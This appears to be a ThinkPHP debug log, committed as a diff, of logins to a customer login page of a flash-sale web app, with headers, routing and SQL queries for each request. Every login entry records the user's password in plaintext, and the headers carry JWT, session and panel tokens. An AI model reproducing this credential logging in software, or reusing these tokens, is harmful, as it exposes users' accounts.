+---------------------------------------------------------------
+[ 2021-01-12T16:43:46+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.049693s] [吞吐率：20.12req/s] [内存消耗：2,376.27kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTAyMiwibmJmIjoxNjEwNDQxMDIyLCJleHAiOjE2MTA0NDIyMjJ9.lUV8eDj17X7wQAoeeJN-4Q5DVYsL258WSyduebXIBqM; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:44:13+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.036760s] [吞吐率：27.20req/s] [内存消耗：3,316.86kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTAyMiwibmJmIjoxNjEwNDQxMDIyLCJleHAiOjE2MTA0NDIyMjJ9.lUV8eDj17X7wQAoeeJN-4Q5DVYsL258WSyduebXIBqM; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000403s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000809s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000377s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA1MywibmJmIjoxNjEwNDQxMDUzLCJleHAiOjE2MTA0NDIyNTN9.QOyxeXRnIPamo6aNw42mNa7jUSMkWXM3a5_pnCSskME'  WHERE  `customer_name` = 'hello' [ RunTime:0.007072s ]
+---------------------------------------------------------------
+[ 2021-01-12T16:44:13+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/main/index
+[运行时间：0.018662s] [吞吐率：53.58req/s] [内存消耗：2,142.05kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA1MywibmJmIjoxNjEwNDQxMDUzLCJleHAiOjE2MTA0NDIyNTN9.QOyxeXRnIPamo6aNw42mNa7jUSMkWXM3a5_pnCSskME; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Main->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/main/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:44:45+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.038630s] [吞吐率：25.89req/s] [内存消耗：3,316.86kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA1MywibmJmIjoxNjEwNDQxMDUzLCJleHAiOjE2MTA0NDIyNTN9.QOyxeXRnIPamo6aNw42mNa7jUSMkWXM3a5_pnCSskME; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000341s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000715s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000350s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA4NSwibmJmIjoxNjEwNDQxMDg1LCJleHAiOjE2MTA0NDIyODV9.EJNEANOTx_SRqjJt3B5iaQdFIIVAlEr8EYdj5sdSrEU'  WHERE  `customer_name` = 'hello' [ RunTime:0.009549s ]
+---------------------------------------------------------------
+[ 2021-01-12T16:44:46+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/main/index
+[运行时间：0.019052s] [吞吐率：52.49req/s] [内存消耗：2,142.05kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA4NSwibmJmIjoxNjEwNDQxMDg1LCJleHAiOjE2MTA0NDIyODV9.EJNEANOTx_SRqjJt3B5iaQdFIIVAlEr8EYdj5sdSrEU; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Main->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/main/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:44:50+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.020799s] [吞吐率：48.08req/s] [内存消耗：2,376.34kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA4NSwibmJmIjoxNjEwNDQxMDg1LCJleHAiOjE2MTA0NDIyODV9.EJNEANOTx_SRqjJt3B5iaQdFIIVAlEr8EYdj5sdSrEU; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:44:56+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.033588s] [吞吐率：29.77req/s] [内存消耗：3,316.86kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA4NSwibmJmIjoxNjEwNDQxMDg1LCJleHAiOjE2MTA0NDIyODV9.EJNEANOTx_SRqjJt3B5iaQdFIIVAlEr8EYdj5sdSrEU; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000481s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000765s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000344s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA5NiwibmJmIjoxNjEwNDQxMDk2LCJleHAiOjE2MTA0NDIyOTZ9.ZcCxN6FryDeiZ0iSVfWdqota5uYWd4Udci-MVMiWJHk'  WHERE  `customer_name` = 'hello' [ RunTime:0.004013s ]
+---------------------------------------------------------------
+[ 2021-01-12T16:44:56+08:00 ] 115.27.214.243 GET 101.37.13.45/customer/main/index
+[运行时间：0.019237s] [吞吐率：51.98req/s] [内存消耗：2,147.38kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA5NiwibmJmIjoxNjEwNDQxMDk2LCJleHAiOjE2MTA0NDIyOTZ9.ZcCxN6FryDeiZ0iSVfWdqota5uYWd4Udci-MVMiWJHk; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Main->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/main/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:45:10+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.021800s] [吞吐率：45.87req/s] [内存消耗：2,376.23kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA5NiwibmJmIjoxNjEwNDQxMDk2LCJleHAiOjE2MTA0NDIyOTZ9.ZcCxN6FryDeiZ0iSVfWdqota5uYWd4Udci-MVMiWJHk; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:45:16+08:00 ] 115.27.214.243 POST 101.37.13.45/customer/login/dologin
+[运行时间：0.065947s] [吞吐率：15.16req/s] [内存消耗：3,322.52kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTA5NiwibmJmIjoxNjEwNDQxMDk2LCJleHAiOjE2MTA0NDIyOTZ9.ZcCxN6FryDeiZ0iSVfWdqota5uYWd4Udci-MVMiWJHk; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000322s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000718s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000376s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTExNiwibmJmIjoxNjEwNDQxMTE2LCJleHAiOjE2MTA0NDIzMTZ9.pvmJ-pLebn06Z76hT0K6lK93mc3Nn-6zYQBAfAv2xF8'  WHERE  `customer_name` = 'hello' [ RunTime:0.014379s ]
+---------------------------------------------------------------
+[ 2021-01-12T16:45:16+08:00 ] 115.27.214.243 GET 101.37.13.45/customer/main/index
+[运行时间：0.019136s] [吞吐率：52.26req/s] [内存消耗：2,147.38kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTExNiwibmJmIjoxNjEwNDQxMTE2LCJleHAiOjE2MTA0NDIzMTZ9.pvmJ-pLebn06Z76hT0K6lK93mc3Nn-6zYQBAfAv2xF8; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Main->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/main/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T19:45:16+08:00 ] 188.134.92.101 GET 101.37.13.45:80/
+[运行时间：0.016905s] [吞吐率：59.15req/s] [内存消耗：1,758.87kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T20:36:46+08:00 ] 185.100.87.191 HEAD 101.37.13.45/
+[运行时间：0.015487s] [吞吐率：64.57req/s] [内存消耗：1,757.97kb] [文件加载：33]
